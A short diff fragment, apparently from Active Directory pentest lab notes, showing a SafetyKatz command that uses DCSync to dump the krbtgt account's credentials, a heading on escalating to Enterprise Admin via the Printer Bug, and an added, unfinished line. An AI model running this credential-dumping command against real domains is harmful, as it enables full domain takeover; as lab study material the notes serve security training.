@@ -655,3 +655,4 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
 *Escalate to Enterprise Admins privileges by abusing Printer Bug!*
+We need to do the same thing with the cerbe
